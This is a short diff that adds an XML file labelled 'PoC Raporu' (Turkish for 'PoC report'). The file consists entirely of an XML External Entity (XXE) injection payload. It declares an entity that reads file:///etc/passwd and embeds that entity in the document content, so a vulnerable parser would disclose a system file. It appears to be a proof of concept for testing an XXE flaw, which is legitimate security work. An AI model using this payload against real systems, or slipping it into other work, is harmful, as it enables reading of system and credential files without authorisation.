@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE about [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<about>
+  <title>PoC Raporu</title>
+  <content>&xxe;</content>
+</about>
